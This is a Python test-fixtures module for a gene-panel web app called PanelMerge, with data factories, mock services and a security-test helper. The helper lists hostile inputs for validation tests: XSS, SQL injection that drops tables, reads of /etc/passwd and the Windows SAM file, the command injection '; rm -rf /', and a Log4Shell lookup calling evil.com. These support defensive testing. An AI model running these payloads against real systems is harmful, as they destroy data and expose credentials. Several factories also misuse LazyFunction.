"""
Test fixtures and utilities for PanelMerge tests
"""
import factory
import factory.fuzzy
import datetime
from app.models import User, AdminMessage, AuditLog, Visit, PanelDownload


class UserFactory(factory.Factory):
    """Factory for creating User instances."""
    
    class Meta:
        model = User
    
    username = factory.Sequence(lambda n: f'user{n}')
    email = factory.LazyAttribute(lambda obj: f'{obj.username}@example.com')
    role = 'user'
    created_at = factory.LazyFunction(datetime.datetime.now())
    
    @factory.post_generation
    def password(obj, create, extracted, **kwargs):
        """Set password after user creation."""
        if extracted:
            obj.set_password(extracted)
        else:
            obj.set_password('defaultpassword')


class AdminUserFactory(UserFactory):
    """Factory for creating Admin User instances."""
    
    role = 'admin'
    username = factory.Sequence(lambda n: f'admin{n}')


class PanelDownloadFactory(factory.Factory):
    """Factory for creating PanelDownload instances."""
    
    class Meta:
        model = PanelDownload
    
    user_id = factory.SubFactory(UserFactory)
    panel_ids = factory.Faker('pystr')
    filename = factory.Faker('file_name', extension='xlsx')
    timestamp = factory.LazyFunction(datetime.datetime.now())


class VisitFactory(factory.Factory):
    """Factory for creating Visit instances."""
    
    class Meta:
        model = Visit
    
    ip_address = factory.Faker('ipv4')
    user_agent = factory.Faker('user_agent')
    session_id = factory.Faker('uuid4')
    timestamp = factory.LazyFunction(datetime.datetime.now())


class AuditLogFactory(factory.Factory):
    """Factory for creating AuditLog instances."""
    
    class Meta:
        model = AuditLog
    
    user_id = factory.SubFactory(UserFactory)
    action = factory.fuzzy.FuzzyChoice(['login', 'logout', 'upload', 'download', 'view'])
    resource = factory.Faker('word')
    details = factory.Faker('sentence')
    ip_address = factory.Faker('ipv4')
    user_agent = factory.Faker('user_agent')
    timestamp = factory.LazyFunction(datetime.datetime.now())


# Mock data generators for external panel/gene data
def generate_mock_panel_data(panel_id=1):
    """Generate mock panel data for testing."""
    return {
        'panel_id': panel_id,
        'name': f'Test Panel {panel_id}',
        'version': '1.0',
        'description': f'Test panel {panel_id} description',
        'gene_count': 5,
        'genes': ['BRCA1', 'TP53', 'EGFR', 'KRAS', 'APC']
    }


def generate_mock_gene_data(gene_symbol='BRCA1'):
    """Generate mock gene data for testing."""
    return {
        'gene_symbol': gene_symbol,
        'gene_name': f'{gene_symbol} Gene Name',
        'panel_id': 1
    }


class AdminMessageFactory(factory.Factory):
    """Factory for creating AdminMessage instances."""
    
    class Meta:
        model = AdminMessage
    
    title = factory.Faker('sentence', nb_words=4)
    message = factory.Faker('paragraph')
    type = factory.fuzzy.FuzzyChoice(['info', 'warning', 'error', 'success'])
    is_active = True
    created_by = factory.SubFactory(AdminUserFactory)
    created_at = factory.LazyFunction(datetime.datetime.now())
    expires_at = factory.LazyFunction(lambda: datetime.datetime.now() + datetime.timedelta(days=7))


# Sample data generators
def generate_sample_csv_data(num_genes=10):
    """Generate sample CSV data for testing."""
    import random
    
    genes = [
        ('BRCA1', 'BRCA1 DNA Repair Associated'),
        ('BRCA2', 'BRCA2 DNA Repair Associated'),
        ('TP53', 'Tumor Protein P53'),
        ('EGFR', 'Epidermal Growth Factor Receptor'),
        ('KRAS', 'KRAS Proto-Oncogene'),
        ('PIK3CA', 'Phosphatidylinositol-4,5-Bisphosphate 3-Kinase Catalytic Subunit Alpha'),
        ('APC', 'APC Regulator Of WNT Signaling Pathway'),
        ('PTEN', 'Phosphatase And Tensin Homolog'),
        ('ATM', 'ATM Serine/Threonine Kinase'),
        ('MLH1', 'MutL Homolog 1')
    ]
    
    csv_lines = ['Gene Symbol,Gene Name']
    
    for i in range(min(num_genes, len(genes))):
        symbol, name = genes[i]
        csv_lines.append(f'{symbol},{name}')
    
    return '\n'.join(csv_lines)


def generate_sample_excel_data(num_genes=10):
    """Generate sample Excel data for testing."""
    import random
    
    genes = [
        ['BRCA1', 'BRCA1 DNA Repair Associated'],
        ['BRCA2', 'BRCA2 DNA Repair Associated'],
        ['TP53', 'Tumor Protein P53'],
        ['EGFR', 'Epidermal Growth Factor Receptor'],
        ['KRAS', 'KRAS Proto-Oncogene'],
        ['PIK3CA', 'Phosphatidylinositol-4,5-Bisphosphate 3-Kinase Catalytic Subunit Alpha'],
        ['APC', 'APC Regulator Of WNT Signaling Pathway'],
        ['PTEN', 'Phosphatase And Tensin Homolog'],
        ['ATM', 'ATM Serine/Threonine Kinase'],
        ['MLH1', 'MutL Homolog 1']
    ]
    
    data = [['Gene Symbol', 'Gene Name']]
    
    for i in range(min(num_genes, len(genes))):
        data.append(genes[i])
    
    return data


def generate_invalid_csv_data():
    """Generate invalid CSV data for testing."""
    return 'Invalid,Header\nMissingRequiredColumns,True'


def generate_large_csv_data(num_genes=1000):
    """Generate large CSV data for performance testing."""
    csv_lines = ['Gene Symbol,Gene Name']
    
    for i in range(num_genes):
        csv_lines.append(f'GENE{i:04d},Gene {i:04d} Name')
    
    return '\n'.join(csv_lines)


# Test utilities
class TestDataManager:
    """Utility class for managing test data."""
    
    def __init__(self, db_session):
        self.db_session = db_session
    
    def create_test_users(self, count=5):
        """Create multiple test users."""
        users = []
        for i in range(count):
            user = UserFactory()
            users.append(user)
        
        self.db_session.add_all(users)
        self.db_session.commit()
        return users
    
    def create_test_visits(self, count=5):
        """Create multiple test visits."""
        visits = []
        for i in range(count):
            visit = VisitFactory()
            visits.append(visit)
        
        self.db_session.add_all(visits)
        self.db_session.commit()
        return visits
    
    def create_test_downloads(self, user, count=3):
        """Create multiple test downloads for a user."""
        downloads = []
        for i in range(count):
            download = PanelDownloadFactory(user_id=user.id)
            downloads.append(download)
        
        self.db_session.add_all(downloads)
        self.db_session.commit()
        return downloads
    
    def create_complete_test_data(self):
        """Create a complete set of test data."""
        # Create users
        regular_users = self.create_test_users(3)
        admin_user = AdminUserFactory()
        self.db_session.add(admin_user)
        
        # Create visits
        visits = self.create_test_visits(5)
        
        # Create downloads for users
        for user in regular_users:
            self.create_test_downloads(user, 2)
        
        # Create admin messages
        for i in range(3):
            message = AdminMessageFactory(created_by=admin_user.id)
            self.db_session.add(message)
        
        # Create audit logs
        for i in range(5):
            audit_log = AuditLogFactory(user_id=regular_users[0].id)
            self.db_session.add(audit_log)
        
        self.db_session.commit()
        
        return {
            'users': regular_users,
            'admin': admin_user,
            'visits': visits
        }
    
    def cleanup_test_data(self):
        """Clean up all test data."""
        # Delete in reverse order of dependencies
        self.db_session.query(AuditLog).delete()
        self.db_session.query(AdminMessage).delete()
        self.db_session.query(PanelDownload).delete()
        self.db_session.query(Visit).delete()
        self.db_session.query(User).delete()
        self.db_session.commit()


# Mock data providers
class MockAPIResponse:
    """Mock API response for testing external API integrations."""
    
    def __init__(self, status_code=200, json_data=None, text_data=None):
        self.status_code = status_code
        self._json_data = json_data or {}
        self.text = text_data or ''
    
    def json(self):
        return self._json_data
    
    def raise_for_status(self):
        if self.status_code >= 400:
            raise Exception(f"HTTP {self.status_code}")


class MockRedisClient:
    """Mock Redis client for testing."""
    
    def __init__(self):
        self._data = {}
        self._stats = {
            'used_memory': 1000000,
            'keyspace_hits': 100,
            'keyspace_misses': 10
        }
    
    def get(self, key):
        return self._data.get(key)
    
    def set(self, key, value):
        self._data[key] = value
        return True
    
    def setex(self, key, time, value):
        self._data[key] = value
        return True
    
    def delete(self, key):
        if key in self._data:
            del self._data[key]
            return 1
        return 0
    
    def flushdb(self):
        self._data.clear()
        return True
    
    def ping(self):
        return True
    
    def info(self):
        return self._stats
    
    def expire(self, key, time):
        return True if key in self._data else False


# Performance testing utilities
class PerformanceTimer:
    """Utility for timing test operations."""
    
    def __init__(self):
        self.start_time = None
        self.end_time = None
    
    def start(self):
        import time
        self.start_time = time.time()
    
    def stop(self):
        import time
        self.end_time = time.time()
    
    def elapsed(self):
        if self.start_time and self.end_time:
            return self.end_time - self.start_time
        return None
    
    def assert_under(self, max_seconds):
        elapsed = self.elapsed()
        assert elapsed is not None, "Timer not properly started/stopped"
        assert elapsed < max_seconds, f"Operation took {elapsed:.2f}s, expected under {max_seconds}s"


# Security testing utilities
class SecurityTestHelper:
    """Helper for security-related tests."""
    
    @staticmethod
    def generate_malicious_inputs():
        """Generate various malicious inputs for security testing."""
        return [
            # XSS attempts
            '<script>alert("xss")</script>',
            'javascript:alert(1)',
            
            # SQL injection attempts
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            
            # Path traversal attempts
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            
            # Command injection attempts
            '; rm -rf /',
            '| cat /etc/passwd',
            
            # Buffer overflow attempts
            'A' * 10000,
            
            # Unicode attacks
            '\u0000',
            '\ufeff',
            
            # Other dangerous patterns
            '${jndi:ldap://evil.com/a}',
            '{{7*7}}',
        ]
    
    @staticmethod
    def generate_malicious_files():
        """Generate malicious file data for upload testing."""
        return {
            'script_in_csv': 'Gene Symbol,Gene Name\n<script>alert("xss")</script>,BRCA1',
            'sql_injection_csv': 'Gene Symbol,Gene Name\n\'; DROP TABLE genes; --,BRCA1',
            'oversized_data': 'Gene Symbol,Gene Name\n' + ('GENE' + 'A' * 1000 + ',Name\n') * 10000,
            'binary_content': b'\x00\x01\x02\x03\x04\x05',
            'unicode_bomb': '\u0000' * 1000 + '\ufeff' * 1000,
        }
